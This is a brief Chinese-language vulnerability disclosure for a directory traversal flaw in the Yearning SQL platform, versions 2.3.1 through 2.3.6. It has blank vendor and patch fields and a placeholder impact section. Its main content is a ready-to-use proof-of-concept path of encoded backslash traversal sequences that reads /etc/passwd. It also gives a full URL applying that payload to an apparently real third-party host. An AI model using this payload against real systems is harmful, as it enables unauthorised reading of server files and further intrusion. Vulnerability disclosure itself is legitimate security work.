# yearning存在目录遍历漏洞

## 写在前面

厂商url：
安全补丁url：
项目地址：

## 漏洞影响版本

版本: v2.3.1 Interstellar GA 

版本: v 2.3.2 Interstellar GA 

版本: v 2.3.4 Neptune 

版本: v 2.3.5 Neptune

版本: v 2.3.6 Neptune

## 漏洞描述

如果您想完成复现过程，请严格使用我给您提供的poc

```
/front//%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```

![image-20220308110341311](img/image-20220308110341311.png)

访问https://mysql.zb-sx.cn/front//%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd

![image-20220308110402638](img/image-20220308110402638.png)

## 漏洞影响

xxxxx